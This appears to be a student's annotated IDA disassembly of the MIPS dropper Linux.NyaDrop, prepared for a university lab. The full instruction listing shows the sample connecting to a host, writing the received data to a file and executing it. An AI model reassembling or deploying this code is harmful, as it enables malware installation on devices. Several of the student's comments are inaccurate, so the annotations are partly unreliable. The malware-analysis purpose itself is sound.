LOAD:00400000  #
LOAD:00400000  # +-------------------------------------------------------------------------+
LOAD:00400000  # |      This file was generated by The Interactive Disassembler (IDA)      |
LOAD:00400000  # |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
LOAD:00400000  # |                      License info: 48-BABB-7E64-E2                      |
LOAD:00400000  # |                     Georgia Institute of Technology                     |
LOAD:00400000  # +-------------------------------------------------------------------------+
LOAD:00400000  #
LOAD:00400000  # Input SHA256 : C3865EB1C211DE6435D1352647C023C2606F9285D3304D54F17261A16BBEC5FF
LOAD:00400000  # Input MD5    : 752E353A88B6E3E5E5A60891BA06A065
LOAD:00400000  # Input CRC32  : A5E4E7FC
LOAD:00400000
LOAD:00400000  # File Name   : /nethome/callotey3/ECE4894/LabEC/Linux.NyaDrop
LOAD:00400000  # Format      : ELF for MIPS (Executable)
LOAD:00400000  # Imagebase   : 400000
LOAD:00400000  #
LOAD:00400000  # Options     : -fCPIC
LOAD:00400000  # Options     : --mips2
LOAD:00400000  # Options     : --o32
LOAD:00400000  #
LOAD:00400000
LOAD:00400000  # Processor       : mipsb
LOAD:00400000  # Target assembler: GNU assembler
LOAD:00400000  # Byte sex        : Big endian
LOAD:00400000
LOAD:00400000 .set noreorder
LOAD:00400000 .set noat
LOAD:00400000
LOAD:00400000
LOAD:00400000  # ===========================================================================
LOAD:00400000
LOAD:00400000  # Segment type: Pure code
LOAD:00400000                 .text # LOAD
LOAD:00400000 dword_400000:   .word 0x7F454C46         # DATA XREF: LOAD:0040005C↓o
LOAD:00400000                                          # File format: \x7FELF
LOAD:00400004                 .byte 1                  # File class: 32-bit
LOAD:00400005                 .byte 2                  # Data encoding: big-endian
LOAD:00400006                 .byte 1                  # File version
LOAD:00400007                 .byte 0                  # OS/ABI: UNIX System V ABI
LOAD:00400008                 .byte 0                  # ABI Version
LOAD:00400009                 .byte 0, 0, 0, 0, 0, 0, 0  # Padding
LOAD:00400010                 .half 2                  # File type: Executable
LOAD:00400012                 .half 8                  # Machine: MIPS
LOAD:00400014                 .word 1                  # File version
LOAD:00400018                 .word start              # Entry point
LOAD:0040001C                 .word 0x34               # PHT file offset
LOAD:00400020                 .word 0x1F4              # SHT file offset
LOAD:00400024                 .word 0x10001004         # Processor-specific flags
LOAD:00400028                 .half 0x34               # ELF header size
LOAD:0040002A                 .half 0x20               # PHT entry size
LOAD:0040002C                 .half 2                  # Number of entries in PHT
LOAD:0040002E                 .half 0x28               # SHT entry size
LOAD:00400030                 .half 3                  # Number of entries in SHT
LOAD:00400032                 .half 2                  # SHT entry index for string table
LOAD:00400034  # ELF32 Program Header
LOAD:00400034  # PHT Entry 0
LOAD:00400034                 .word 0x70000000         # Type: REGINFO
LOAD:00400038                 .word 0                  # File offset
LOAD:0040003C                 .word 0                  # Virtual address
LOAD:00400040                 .word 0                  # Physical address
LOAD:00400044                 .word 0                  # Size in file image
LOAD:00400048                 .word 0                  # Size in memory image
LOAD:0040004C                 .word 4                  # Flags
LOAD:00400050                 .word 4                  # Alignment
LOAD:00400054  # PHT Entry 1
LOAD:00400054                 .word 1                  # Type: LOAD
LOAD:00400058                 .word 0                  # File offset
LOAD:0040005C                 .word dword_400000       # Virtual address
LOAD:00400060                 .word 0x400000           # Physical address
LOAD:00400064                 .word 0x1E0              # Size in file image
LOAD:00400068                 .word 0x1E0              # Size in memory image
LOAD:0040006C                 .word 5                  # Flags
LOAD:00400070                 .word 0x10000            # Alignment
LOAD:00400074                 .word 0, 0, 0, 0, 0, 0, 0
LOAD:00400074
.text:00400090  # ===========================================================================
.text:00400090
.text:00400090  # Segment type: Pure code
.text:00400090                 .text
.text:00400090
.text:00400090  # =============== S U B R O U T I N E =======================================
.text:00400090
.text:00400090
.text:00400090                 .globl start
.text:00400090 start:                                   # DATA XREF: LOAD:00400018↑o
.text:00400090
.text:00400090 var_800         = -0x800
.text:00400090 var_18          = -0x18
.text:00400090 arg_0           =  0
.text:00400090 arg_4           =  4
.text:00400090 arg_64          =  0x64
.text:00400090 arg_68          =  0x68
.text:00400090
.text:00400090                 addiu   $zero, 0xA       # After defining the program header table and local vars,
.text:00400090                                          # begins malware execution by trying to overwrite $zero,
.text:00400090                                          # which is hardwired to 0, so the value gets discarded
.text:00400090                                          # possibly trying to fool reverse engineers or a nop created by compiler
.text:00400094                 lw      $a0, arg_0($sp)  # set first argument register, $a0, to arg0 of the function call
.text:00400094                                          # located at the current $sp address
.text:00400098                 addiu   $a1, $sp, arg_4  # increment stack ptr addr and store as next arg, $a1
.text:0040009C                 addiu   $a2, $a0, 1      # add 1 to arg0 value and store as next arg, $a2
.text:004000A0                 sll     $a2, 2           # multiply $a2 value by 4, possibly ensuring word alignment
.text:004000A4                 add     $s0, $a2, $a1    # add calculated value to current stack addr and store in
.text:004000A4                                          # $s0, pertains to environment strings prior to malware
.text:004000A8                 li      $v0, 0x1057      # store 0x1057 in $v0,determines syscall operation 4183 decimal
.text:004000AC                 li      $a0, 2           # reset $a0 to 2, AF_INET
.text:004000B0                 li      $a1, 2           # reset $a1 to 2, socket datagram
.text:004000B4                 li      $a2, 0           # reset $a2 to 0, default protocol
.text:004000B8                 syscall 0                # make syscall with the above arguments
.text:004000B8                                          # syscall(0x1057) is sys_socket(), so a0 = domain
.text:004000B8                                          # a1 = type, a2 = protocol
.text:004000B8                                          # creates IP datagram
.text:004000B8                                          # $v0 holds result either sockfd or -1 if error
.text:004000BC                 move    $s1, $v0         # save sockfd in $s1
.text:004000C0                 li      $v0, 0x6E796100  # load immediate value
.text:004000C8                 sw      $v0, arg_0($sp)  # store immediate value at $sp, replacing arg0
.text:004000CC                 li      $v0, 0xFA5       # load immediate value, decimal 4005 will call sys_open()
.text:004000D0                 move    $a0, $sp         # set first arg for syscall to 0x6E796100, ptr to path name
.text:004000D4                 li      $a1, 0x101       # set next arg for syscall to 0x101, setting flags
.text:004000D8                 li      $a2, 0xFFFF      # set next arg for syscall to 0xFFFF, setting all modes
.text:004000DC                 syscall 0                # make syscall with the above arguments
.text:004000DC                                          # syscall(0xFA5) is sys_open(), so a0 = path name ptr
.text:004000DC                                          # a1 = flags, a2 = mode
.text:004000DC                                          # opens file at path and returns ptr
.text:004000DC                                          # $v0 holds result either an address or -1 if error
.text:004000E0                 move    $s2, $v0         # save address in $s2
.text:004000E4                 addi    $s3, $sp, var_18  # save sp - 18 in s3 (below current stack frame)
.text:004000E4                                          # holds socket addr
.text:004000E8                 addi    $s4, $sp, arg_4  # save sp + 4 in s4 (arg1 address)
.text:004000EC                 lw      $s4, 4($s4)      # store arg2 value in s4
.text:004000F0                 li      $v0, 2           # load immediate into v0
.text:004000F4                 sb      $zero, 0($s3)    # overwrite LSB of s3 with 0
.text:004000F8                 sb      $v0, 1($s3)      # overwrite next byte of s3 with 2
.text:004000FC                 li      $t0, 7           # load 7 into t0
.text:00400100                 addi    $t1, $s3, 2      # store s3 + 2 in t1
.text:00400104                 move    $t2, $s4         # t2 == arg2
.text:00400108                 addiu   $zero, 0xA       # presumably a nop
.text:0040010C
.text:0040010C loc_40010C:                              # CODE XREF: start+B0↓j
.text:0040010C                 move    $v0, $zero       # v0 = 0
.text:00400110                 move    $v1, $zero       # v1 = 0
.text:00400114                 lb      $v0, 0($t2)      # first byte of arg2
.text:00400118                 lb      $v1, 1($t2)      # 2nd byte of arg2
.text:0040011C                 addi    $v0, -0x41       # v0 = -0x41
.text:00400120                 addi    $v1, -0x41       # v1 = -0x41
.text:00400124                 sll     $v0, 4           # v0 *= 2^4
.text:00400128                 or      $v0, $v1         # or lower bits
.text:0040012C                 sb      $v0, 0($t1)      # v0 holds the lower byte of t1 value
.text:00400130                 addi    $t0, -1          # t0 starts at 7 and decrements by 1 per loop
.text:00400134                 addi    $t1, 1           # t1 += 1
.text:00400138                 beqz    $t0, loc_400148  # once t0 = 0 (8 loops), jump to next code block
.text:0040013C                 addi    $t2, 2           # increment t2 value to get different bytes next loop
.text:00400140                 j       loc_40010C       # continue loop
.text:00400144                 move    $at, $at         # unreachable instruction
.text:00400148  # ---------------------------------------------------------------------------
.text:00400148
.text:00400148 loc_400148:                              # CODE XREF: start+A8↑j
.text:00400148                 addiu   $zero, 0xA       # nop
.text:0040014C                 li      $v0, 0x104A      # set syscall arg for sys_connect
.text:00400150                 move    $a0, $s1         # sockfd = IP socket created previously
.text:00400154                 move    $a1, $s3         # sockaddr = ptr to IP socket
.text:00400158                 li      $a2, 0x10        # set addrlen to 16
.text:0040015C                 syscall 0                # call sys_connect with above args
.text:00400160
.text:00400160 loc_400160:                              # CODE XREF: start+104↓j
.text:00400160                 li      $v0, 0x104F      # set syscall arg for sys_recv()
.text:00400164                 move    $a0, $s1         # recieve from IP socket created previously
.text:00400168                 addi    $a1, $sp, var_800  # a1 holds addr 800 below sp
.text:00400168                                          # uses random point on stack as *buf
.text:0040016C                 li      $a2, 0x400       # length = 0x400, no flags
.text:00400170                 syscall 0                # call sys_recv, will block until something comes
.text:00400174                 bnez    $a3, loc_4001D4  # if a3 indicates error, jump to end
.text:00400178                 move    $a2, $v0         # a2 holds number of bytes received
.text:0040017C                 blez    $v0, loc_40019C  # if bytes received jump to next code
.text:00400180                 move    $at, $at         # The Assembler Temporary used by the assembler in expanding
.text:00400180                                          # pseudo-ops.
.text:00400184                 li      $v0, 0xFA4       # sets syscall arg as 0xFA4 == 4004, sys_write
.text:00400188                 move    $a0, $s2         # set a0 to opened file
.text:0040018C                 addi    $a1, $sp, var_800  # a1 = ptr to value read from socket
.text:00400190                 syscall 0                # call sys_write
.text:00400194                 j       loc_400160       # repeat to wait for next packet
.text:00400198                 move    $at, $at         # The Assembler Temporary used by the assembler in expanding
.text:00400198                                          # pseudo-ops.
.text:0040019C  # ---------------------------------------------------------------------------
.text:0040019C
.text:0040019C loc_40019C:                              # CODE XREF: start+EC↑j
.text:0040019C                 li      $v0, 0xFA6       # set syscall arg to call sys_close
.text:004001A0                 move    $a0, $s1         # a0 = IP socket opened
.text:004001A4                 syscall 0                # close socket
.text:004001A8                 li      $v0, 0xFA6       # set syscall arg to call sys_close
.text:004001AC                 move    $a0, $s2         # a0 = file opened
.text:004001B0                 syscall 0                # close file
.text:004001B4                 sw      $sp, arg_64($sp)  # raise sp addr presumably above manipulated stack
.text:004001B8                 sw      $zero, arg_68($sp)  # discarded value, nop
.text:004001BC                 addiu   $zero, 0xA       # discarded value, nop
.text:004001C0                 li      $v0, 0xFAB       # set v0 to call sys_execve
.text:004001C4                 move    $a0, $sp         # *pathname = stack ptr(now higher in mem)
.text:004001C8                 addi    $a1, $sp, arg_64  # argv = another 64 higher on stack, presumably previous args
.text:004001CC                 move    $a2, $s0         # set a2 to ptr to environment strings, address was calculated previously
.text:004001D0                 syscall 0                # call sys_execve to resume victim program
.text:004001D4
.text:004001D4 loc_4001D4:                              # CODE XREF: start+E4↑j
.text:004001D4                 addiu   $zero, 0xA       # nop
.text:004001D8                 move    $at, $at         # The Assembler Temporary used by the assembler in expanding
.text:004001D8                                          # pseudo-ops.
.text:004001DC                 move    $at, $at         # The Assembler Temporary used by the assembler in expanding
.text:004001DC  # End of function start                 # pseudo-ops.
.text:004001DC
.text:004001DC
.text:004001DC                  # end start
